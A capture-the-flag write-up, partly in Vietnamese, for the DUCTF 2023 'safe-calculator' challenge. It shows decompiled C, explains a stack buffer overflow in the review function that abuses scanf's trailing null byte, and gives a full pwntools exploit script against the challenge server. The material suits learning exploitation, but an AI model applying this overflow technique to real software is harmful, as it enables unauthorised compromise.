# safe-calculator

## Code

```c
unsigned __int64 calculate()
{
  __int64 v1; // [rsp+0h] [rbp-20h] BYREF
  __int64 v2; // [rsp+8h] [rbp-18h] BYREF
  __int64 v3; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  __isoc99_sscanf(sum, "{ arg1: %d, arg2: %d}", &v1, &v2);
  v3 = v1 + v2;
  printf("The result of the sum is: %d, it's over 9000!\n", v1 + v2);
  if ( v3 == 0xB98C5F3700002329LL )
  {
    puts("That is over 9000 indeed, how did you do that?");
    win();
  }
  return v4 - __readfsqword(0x28u);
}
unsigned __int64 leave_review()
{
  char v1[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Enjoyed our calculator? Leave a review! : ");
  __isoc99_scanf("%48[ -~]", v1);
  return v2 - __readfsqword(0x28u);
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("1. Use the safe calculator");
  puts("2. Review the safe calculator");
  while ( 1 )
  {
    while ( 1 )
    {
      printf("> ");
      __isoc99_scanf("%d", &v4);
      getchar();
      result = v4;
      if ( v4 != 1 )
        break;
      calculate();
    }
    if ( v4 != 2 )
      break;
    leave_review();
  }
  return result;
}
```

## Phân tích

- Chương trình có bof ở chỗ `leave_review`, để thay đổi 4 byte và các byte được nhâp ở `leave_review` từ 0x20-0x7e
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/fc4230a0-dd7e-4506-9d50-3dc629975abc)
- Phần khó nhất là ở 2 byte `5F37` mình suy nghĩ khá lâu, thì mình nhớ rằng scanf luôn có null byte khi kết thúc chuỗi nhập vào. Do đó mình sẽ tận dụng việc đó để ow 7fff thành 0000

## Khai thác

```python
part1 = p8(0x37) + p8(0x5F) + p8(0x46) + p8(0x5c)
part2 = p8(0x46) + p8(0x5d)
sla(b'> ', b'2')
sla(b' : ', b'a'*8*4 + b'a'*4 + part1 + b'a'*6 + part2)
sla(b'> ', b'1')
```

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/c79d7fe5-b7e5-49f1-a6ed-3f323ea6cab2)

```python
sla(b'> ', b'2')
sla(b' : ', b'a'*8*4 + b'a'*4 + part1 + b'a'*5)
sla(b'> ', b'1')
```

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/fcdc1d78-4cee-4513-852f-990481036007)

```python
sla(b'> ', b'2')
sla(b' : ', b'a'*8*4 + b'a'*4 + part1 + b'a'*4)
sla(b'> ', b'1')
```

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/bce93c93-d5c9-40aa-b0dc-446ea21ff3bd)

## Script
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('safe-calculator', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b*calculate+66
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('2023.ductf.dev', 30015)
else:
        p = process(exe.path)

GDB()
part1 = p8(0x37) + p8(0x5F) + p8(0x46) + p8(0x5c)
part2 = p8(0x46) + p8(0x5d)
sla(b'> ', b'2')
sla(b' : ', b'a'*8*4 + b'a'*4 + part1 + b'a'*6 + part2) 
sla(b'> ', b'1')

sla(b'> ', b'2')
sla(b' : ', b'a'*8*4 + b'a'*4 + part1 + b'a'*5) 
sla(b'> ', b'1')

sla(b'> ', b'2')
sla(b' : ', b'a'*8*4 + b'a'*4 + part1 + b'a'*4) 
sla(b'> ', b'1')
p.interactive()
```